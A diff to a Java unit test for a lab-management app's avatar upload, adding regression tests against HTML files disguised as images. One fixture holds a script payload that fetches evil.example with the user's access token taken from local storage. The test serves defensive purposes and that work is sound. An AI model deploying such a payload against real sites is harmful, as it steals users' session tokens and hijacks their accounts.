@@ -3,7 +3,9 @@ package com.lias.labmanagement.members.service;
 import com.lias.labmanagement.audit.service.AuditService;
 import com.lias.labmanagement.common.enums.MemberStatus;
 import com.lias.labmanagement.common.enums.RoleChangeSource;
+import com.lias.labmanagement.common.exception.BadRequestException;
 import com.lias.labmanagement.common.storage.FileStorageService;
+import com.lias.labmanagement.common.storage.StoredFile;
 import com.lias.labmanagement.governance.service.MandateService;
 import com.lias.labmanagement.governance.service.UserRoleSyncService;
 import com.lias.labmanagement.members.entity.Member;
@@ -18,17 +20,21 @@ import org.mockito.InOrder;
 import org.mockito.InjectMocks;
 import org.mockito.Mock;
 import org.mockito.junit.jupiter.MockitoExtension;
+import org.springframework.mock.web.MockMultipartFile;
 
+import java.nio.charset.StandardCharsets;
 import java.time.LocalDate;
 import java.util.Optional;
 import java.util.UUID;
 
 import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions.assertThatThrownBy;
 import static org.mockito.ArgumentMatchers.any;
 import static org.mockito.ArgumentMatchers.eq;
 import static org.mockito.Mockito.inOrder;
 import static org.mockito.Mockito.never;
 import static org.mockito.Mockito.verify;
+import static org.mockito.Mockito.verifyNoInteractions;
 import static org.mockito.Mockito.when;
 
 /**
@@ -109,5 +115,38 @@ class MemberServiceTest {
         order.verify(mandateService)
                 .endAllActiveMandatesForMember(eq(memberId), any(LocalDate.class), any(String.class));
         order.verify(memberRepository).save(member);
+    }
+
+    /*
+     * Avatars are served from /files/public/** without authentication, on the application's
+     * origin, with a type derived from the file extension. An HTML page uploaded as an
+     * "image" ran as a page of LIAS and could read the access token from local storage.
+     */
+
+    @Test
+    void aPageDisguisedAsAnImageIsRefusedWhateverItsDeclaredType() {
+        MockMultipartFile disguised = new MockMultipartFile("file", "photo.html", "image/png",
+                "<!doctype html><script>fetch('//evil.example/?t='+localStorage.lias_access_token)</script>"
+                        .getBytes(StandardCharsets.UTF_8));
+
+        assertThatThrownBy(() -> service.uploadAvatar(UUID.randomUUID(), disguised))
+                .isInstanceOf(BadRequestException.class);
+        verifyNoInteractions(fileStorageService);
+    }
+
+    @Test
+    void aRealImageIsStoredUnderTheExtensionOfItsContentNotOfItsName() {
+        UUID userId = UUID.randomUUID();
+        byte[] png = {(byte) 0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0x0D};
+        MockMultipartFile image = new MockMultipartFile("file", "photo.html", "image/png", png);
+        when(memberRepository.findByUserId(userId)).thenReturn(Optional.of(member));
+        when(memberRepository.save(member)).thenReturn(member);
+        when(fileStorageService.store(image, "public/avatars", ".png"))
+                .thenReturn(new StoredFile("x.png", "photo.html", "image/png", png.length, "public/avatars/x.png"));
+
+        service.uploadAvatar(userId, image);
+
+        verify(fileStorageService).store(image, "public/avatars", ".png");
+        assertThat(member.getPhotoUrl()).isEqualTo("/files/public/avatars/x.png");
     }
 }
